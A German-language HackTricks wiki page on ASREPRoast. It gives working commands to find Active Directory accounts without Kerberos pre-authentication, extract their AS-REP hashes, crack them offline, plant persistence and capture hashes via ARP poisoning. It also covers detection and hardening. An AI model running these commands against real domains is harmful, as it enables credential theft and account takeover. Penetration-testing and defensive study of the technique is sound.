# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, bei denen das **Attribut „Kerberos pre-authentication required“** fehlt. Diese Sicherheitslücke ermöglicht es Angreifern im Wesentlichen, beim Domain Controller (DC) eine Authentifizierung für einen Benutzer anzufordern, ohne dessen Passwort zu benötigen. Der DC antwortet dann mit einer Nachricht, die mit einem vom Passwort des Benutzers abgeleiteten Schlüssel verschlüsselt ist. Angreifer können versuchen, diese offline zu knacken, um das Passwort des Benutzers herauszufinden.

Die wichtigsten Voraussetzungen für diesen Angriff sind:

- **Fehlende Kerberos pre-authentication**: Bei den Zielbenutzern darf diese Sicherheitsfunktion nicht aktiviert sein.
- **Verbindung zum Domain Controller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optionales Domain-Konto**: Ein Domain-Konto ermöglicht es Angreifern, gefährdete Benutzer mithilfe von LDAP-Abfragen effizienter zu identifizieren. Ohne ein solches Konto müssen Angreifer Benutzernamen erraten.

#### Gefährdete Benutzer auflisten (Domain-Anmeldedaten erforderlich)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### AS_REP-Anfragenachricht

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus fordert standardmäßig **RC4** an, daher zeigt Event ID **4768** normalerweise **preauth type 0** und **ticket encryption type 0x17**. Wenn du **`/aes`** hinzufügst (oder RC4 für das Ziel deaktiviert ist), sind stattdessen **AES etypes** zu erwarten.<sup>[[2]](#references)</sup>

#### Kurze Einzeiler (Linux)

- Ermittle zuerst potenzielle Ziele (z. B. aus geleakten Build-Pfaden) mit Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast eine ganze Username-Liste ohne gültige creds mit NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Wenn du creds hast, lass NetExec LDAP abfragen und alle roastbaren Konten für dich anfordern: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Wenn die Ausgabe mit **`$krb5asrep$23$`** beginnt, cracke sie mit Hashcat **`-m 18200`**. Beginnt sie mit **`$krb5asrep$17$`** oder **`$krb5asrep$18$`**, verwende vorzugsweise John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Geh nicht davon aus, dass jeder AS-REP roast RC4 verwendet. Moderne Tools können je nach angefordertem/ausgehandeltem enctype **RC4** (`$krb5asrep$23$`) oder **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) zurückgeben. **`hashcat -m 18200`** ist für **etype 23** gedacht, während **John** `krb5asrep` direkt für **17/18/23** verarbeitet.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

Erzwinge, dass für einen Benutzer keine **preauth** erforderlich ist, für den du über **GenericAll**-Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) verfügst:

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Erkennung und Härtung

Eine erfolgreiche **AS-REP-Anfrage ohne Präauthentifizierung** erzeugt auf dem DC ein **4768**-Ereignis mit `Status=0x0` und `PreAuthType=0`; damit wird eine Anfrage protokolliert, nicht aber bewiesen, dass jemand die Antwort geknackt oder das Konto kompromittiert hat. Die Erkennung sollte nicht RC4 voraussetzen: `TicketEncryptionType=0x17` ist ein nützliches Signal für schwache Verschlüsselung, aber ein Angreifer kann AES anfordern (Ereignisprotokollwerte `0x11`/`0x12`). Unter Windows Server 2016 und höher wird mit dem kumulativen Update vom 14. Januar 2025 (oder einem neueren) in Version 2 des Ereignisses 4768 außerdem `ClientAdvertizedEncryptionTypes` sowie die unterstützten Etypes und verfügbaren Schlüssel des Kontos/DCs angezeigt.<sup>[[5]](#references)</sup>

Bei einer praktischen Suche wird ein Client markiert, der ausschließlich RC4 anbietet, obwohl für das Konto AES-Schlüssel vorhanden sind. Anschließend werden gehäufte Anfragen von einer Quell-IP über mehrere Benutzer ohne Präauthentifizierung hinweg korreliert. Lege eine Baseline legitimer Ausnahmen fest, anstatt bei jedem `PreAuthType=0`-Ereignis einen Alarm auszulösen.

Zur Zuordnung normalisiere das Feld `IpAddress` (das IPv4-Adressen im `::ffff:`-Format enthalten kann) und vergleiche den Zeitraum mit 4769-Service-Ticket- oder 5140-Freigabezugriffsereignissen. Diese Ereignisse können Konten nennen, die von derselben Adresse aus aktiv waren, aber für eine AS-REP-Anfrage ohne Präauthentifizierung ist kein authentifiziertes Konto erforderlich. Gemeinsame Hosts, NAT, Proxys und mehrere Sitzungen bedeuten, dass eine übereinstimmende IP **nicht** die Person oder das Konto identifiziert, von der bzw. dem die AS-REQ gesendet wurde. Betrachte die zugehörigen Konten als Ermittlungsansätze und bestätige sie anhand von Endpoint- oder Netzwerkdaten.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Die dauerhafte Lösung besteht darin, bei jedem Benutzer, der diese Einstellung nicht zwingend benötigt, **Kerberos-Preauthentifizierung nicht erforderlich** zu deaktivieren und offengelegte Kontopasswörter zu ändern. Falls eine Ausnahme nicht entfernt werden kann, sollte ein langes, zufällig generiertes Passwort verwendet und die Berechtigungen sollten auf ein Minimum beschränkt werden. Das Deaktivieren von RC4 erhöht den Aufwand für das Knacken, verhindert Roasting aber nicht, da AES-AS-REP-Antworten weiterhin offline geknackt werden können.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast ohne Zugangsdaten

Ein Angreifer im Netzwerkpfad kann das AS-REP abfangen, das während eines normalen, präauthentifizierten AS-Austauschs zurückgegeben wird, und dessen verschlüsselten Teil für das Offline-Knacken aufbereiten. Anders als beim klassischen ASREPRoasting ist dafür `DONT_REQ_PREAUTH` nicht erforderlich; betroffen sind jedoch nur Konten, deren Kerberos-Austausch tatsächlich abgefangen wird. **ASRepCatcher** erlangt standardmäßig durch einseitiges ARP Poisoning die nötige Position oder kann mit `--disable-spoofing` den Datenverkehr einer anderen MitM-Technik verarbeiten.<sup>[[6]](#references)</sup>\
Wenn du nach dem verwandten Trick ohne Zugangsdaten suchst, der von einem Principal ohne Präauthentifizierung ein **Service-Ticket** statt eines **TGT** zurückgibt, siehe [Kerberoast](kerberoast.md).

Im `relay`-Modus leitet [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) abgefangene AS-REQs weiter und erzwingt **RC4**, wenn beide Seiten es noch zulassen. `listen` verändert keine Pakete und fängt daher den Enctype ab, auf den sich Client und DC geeinigt haben. Beschränke Poisoning nach Möglichkeit mit `-t`/`-tf`, anstatt das gesamte Subnetz zu betreffen.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Ereignis 4768: Ein Kerberos-Authentifizierungsticket wurde angefordert](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Sicherheitsereignis 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Sicherheitsereignis 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
